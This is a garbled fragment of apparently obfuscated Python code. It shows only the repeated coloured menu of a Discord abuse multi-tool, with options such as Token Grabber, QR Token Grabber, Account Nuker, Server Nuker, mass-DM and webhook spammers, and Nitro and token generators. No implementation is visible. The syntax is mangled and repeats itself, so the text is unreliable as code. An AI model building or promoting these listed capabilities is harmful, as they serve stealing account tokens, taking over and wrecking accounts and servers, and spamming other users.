'][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['32'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']([]['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['32'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''] + []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['32'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' EXIT']([]['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        